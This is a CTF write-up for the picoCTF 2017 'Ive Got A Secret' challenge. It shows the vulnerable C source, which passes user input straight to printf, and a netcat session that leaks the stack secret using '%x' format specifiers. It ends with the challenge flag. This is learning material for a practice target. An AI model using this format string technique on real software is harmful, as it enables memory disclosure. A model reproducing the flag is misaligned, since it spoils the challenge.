<!-- This markdown file is writeup template. -->

## Ive Got A Secret 75pt

### Problem
> Hopefully you can find the right format for my [secret](https://webshell2017.picoctf.com/static/c124d2912061647aa59424b49206e93b/secret)! [Source](https://webshell2017.picoctf.com/static/c124d2912061647aa59424b49206e93b/secret.c). Connect on shell2017.picoctf.com:58570.

### Answer
Let's check the Hint.

> This is a beginning format string attack.

Looking at source code, we found that a user input string is directly printed using printf.

```c:secret.c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_LEN 64
char buffer[BUF_LEN];

int main(int argc, char** argv) {
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd == -1){
        puts("Open error on /dev/urandom. Contact an admin\n");
        return -1;
    }
    int secret;
    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
        puts("Read error. Contact admin!\n");
        return -1;
    }
    close(fd);
    printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);

    int not_secret;
    printf("Now tell my secret in hex! Secret: ");
    fflush(stdout);
    scanf("%x", &not_secret);
    if(secret == not_secret){
        puts("Wow, you got it!");
        system("cat ./flag.txt");   
    }else{
        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    }

    return 0;
}
```

In this case it turns out that the value for secret is the sixth element on the stack during the call to printf. 

```bash
$ nc shell2017.picoctf.com 58570
Give me something to say!
%x %x %x %x %x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 662be5c8 3 f7fc73c4 ffffdca0 0
Now tell my secret in hex! Secret: 0x662be5c8
326edd4743c7046d72d29e911ae8a412
Wow, you got it!
```

### Flag
326edd4743c7046d72d29e911ae8a412
